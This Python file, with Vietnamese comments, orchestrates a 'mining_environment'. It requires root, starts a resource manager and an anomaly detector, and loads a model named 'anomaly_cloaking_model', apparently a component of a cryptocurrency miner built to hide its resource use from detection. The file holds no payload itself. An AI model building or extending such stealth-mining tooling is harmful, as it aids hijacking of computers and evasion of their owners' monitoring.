# system_manager.py

"""
system_manager.py

Lớp chính quản lý toàn bộ hệ thống.
"""

import os
import sys
from pathlib import Path
from time import sleep

# Import lớp SystemManager
from resource_manager import ResourceManager, AnomalyDetector
from logging_config import setup_logging
from auxiliary_modules.cgroup_manager import assign_process_to_cgroups

# Đường dẫn tới các thư mục và cấu hình từ biến môi trường
CONFIG_DIR = Path(os.getenv('CONFIG_DIR', '/app/mining_environment/config'))
MODELS_DIR = Path(os.getenv('MODELS_DIR', '/app/mining_environment/models'))
LOGS_DIR = Path(os.getenv('LOGS_DIR', '/app/mining_environment/logs'))

# Đường dẫn tới các mô hình AI
RESOURCE_OPTIMIZATION_MODEL_PATH = MODELS_DIR / "resource_optimization_model.pt"
ANOMALY_CLOAKING_MODEL_PATH = MODELS_DIR / "anomaly_cloaking_model.pt"

# Thiết lập logger
logger = setup_logging('system_manager', LOGS_DIR / 'system_manager.log', 'INFO')

class SystemManager:
    """
    Lớp kết hợp cả ResourceManager và AnomalyDetector, đảm bảo rằng hai lớp này hoạt động đồng bộ và không gây xung đột khi truy cập các tài nguyên chung.
    """
    def __init__(self):
        self.resource_manager = ResourceManager.get_instance()
        self.anomaly_detector = AnomalyDetector()

    def start(self):
        logger.info("Đang khởi động SystemManager...")
        self.resource_manager.start()
        self.anomaly_detector.start()
        logger.info("SystemManager đã được khởi động thành công.")

    def stop(self):
        logger.info("Đang dừng SystemManager...")
        self.resource_manager.stop()
        self.anomaly_detector.stop()
        logger.info("Đã dừng SystemManager thành công.")

def start():
    # Kiểm tra xem các mô hình AI có tồn tại không
    if not RESOURCE_OPTIMIZATION_MODEL_PATH.exists():
        logger.error(f"Mô hình AI không tồn tại tại: {RESOURCE_OPTIMIZATION_MODEL_PATH}")
        sys.exit(1)
    if not ANOMALY_CLOAKING_MODEL_PATH.exists():
        logger.error(f"Mô hình AI không tồn tại tại: {ANOMALY_CLOAKING_MODEL_PATH}")
        sys.exit(1)

    system_manager = SystemManager()
    system_manager.start()

    # Giữ cho thread SystemManager chạy liên tục
    try:
        while True:
            sleep(1)
    except KeyboardInterrupt:
        logger.info("Nhận tín hiệu dừng từ người dùng. Đang dừng SystemManager...")
        system_manager.stop()
    except Exception as e:
        logger.error(f"Lỗi khi chạy SystemManager: {e}")
        system_manager.stop()
        sys.exit(1)

if __name__ == "__main__":
    # Đảm bảo script chạy với quyền root
    if os.geteuid() != 0:
        print("Script phải được chạy với quyền root.")
        sys.exit(1)

    start()
